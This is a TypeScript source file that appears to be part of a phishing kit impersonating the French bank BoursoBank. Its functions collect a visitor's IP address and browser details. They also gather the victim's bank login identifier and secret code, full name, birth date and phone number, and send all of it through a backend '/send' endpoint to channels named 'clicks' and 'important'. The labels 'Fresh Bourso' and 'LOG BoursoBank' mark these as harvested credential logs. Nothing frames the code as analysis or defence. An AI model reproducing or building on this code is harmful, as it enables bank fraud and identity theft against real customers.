import { apiPost } from './api';

async function getIp(): Promise<string> {
  try {
    const d: any = await apiPost('/check-ip', {});
    return d.ip || 'unknown';
  } catch { return 'unknown'; }
}

async function send(channel: string, text: string): Promise<void> {
  try { await apiPost('/send', { channel, text }); } catch {}
}

export const sendLandingNotification = async () => {
  const ip = await getIp();
  const ua = navigator.userAgent.substring(0, 80);
  const lang = navigator.language?.toUpperCase().substring(0, 2) || 'XX';
  let msg = '<b>+1 BoursoBank 🏦</b>\n';
  msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
  msg += `IP : <code>${ip}</code>\n`;
  msg += `Lang : ${lang}\n`;
  msg += `UA : <code>${ua}</code>\n`;
  msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
  await send('clicks', msg);
};

export const sendLoginNotification = async (identifiant: string, password: string) => {
  const ip = await getIp();
  const ua = navigator.userAgent.substring(0, 80);
  let msg = '<b>🏦 Login BoursoBank</b>\n';
  msg += `├ 👤 Identifiant : <code>${identifiant}</code>\n`;
  msg += `└ 🔒 Code secret : <code>${password}</code>\n\n`;
  msg += `🎯 IP : <code>${ip}</code>\n`;
  msg += `🎯 UA : <code>${ua}</code>\n\n`;
  msg += '<b>— Fresh Bourso —</b>';
  await send('clicks', msg);
};

export const sendVerificationNotification = async (
  nom: string, prenom: string, date: string, tel: string,
  identifiant: string, password: string
) => {
  const ip = await getIp();
  const ua = navigator.userAgent.substring(0, 80);
  let msg = '<b>🏦 Vérification BoursoBank</b>\n';
  msg += `├ 🪪 Nom et Prénom : <code>${nom} ${prenom}</code>\n`;
  msg += `├ 📅 Date de Naissance : <code>${date}</code>\n`;
  msg += `└ 📱 Numéro de Téléphone : <code>${tel}</code>\n\n`;
  msg += `<blockquote><b>— 🏦 LOG BoursoBank —</b>\n`;
  msg += `├ 👤 Identifiant : <code>${identifiant}</code>\n`;
  msg += `└ 🔒 Code secret : <code>${password}</code></blockquote>\n\n`;
  msg += `🎯 IP : <code>${ip}</code>\n`;
  msg += `🎯 UA : <code>${ua}</code>\n\n`;
  msg += '<b>— Fresh Bourso —</b>';
  await send('important', msg);
};
